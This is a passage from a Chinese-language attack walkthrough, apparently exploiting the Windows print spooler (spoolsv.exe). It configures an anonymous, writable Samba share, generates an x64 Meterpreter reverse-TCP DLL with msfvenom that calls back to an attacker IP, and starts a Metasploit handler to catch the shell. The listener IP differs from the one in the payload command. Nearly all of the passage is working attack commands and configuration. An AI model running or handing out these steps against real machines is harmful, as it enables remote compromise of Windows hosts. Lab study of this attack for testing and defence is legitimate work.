#### 2.开启匿名访问smb

##### 2.1 配置/etc/samba/smb.conf

##### 这里我使用原作者的也不行，后面参考了Gamma实验室公众号的配置才可以成功访问，链接在此：[https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ](https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&mid=2247488391&idx=1&sn=8e59b4e285e7b8ae0a6355370b8be423&scene=21#wechat_redirect)

![](../Images/a2f50d68b5570adeef09412e53c7fac0.png)

```
\[global\]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config \* : backend = tdb
smb ports = 445

\[smb\]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
```

#### 配置完后，启动smbd

```
sudo service smbd start
```

#### 因为spoolsv.exe是x64的，所以生成的dll也得是x64，生成dll；生成dll

```
msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.153.133 LPORT=7893 -f dll -o /tmp/rever.dll
```

![](../Images/8a0caf774af82606f3bb5ea122b8f4ea.png)

#### 开启监听

```
msfconsole
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse\_tcp
set lhost 192.168.173.133
set lport 7893
run
```
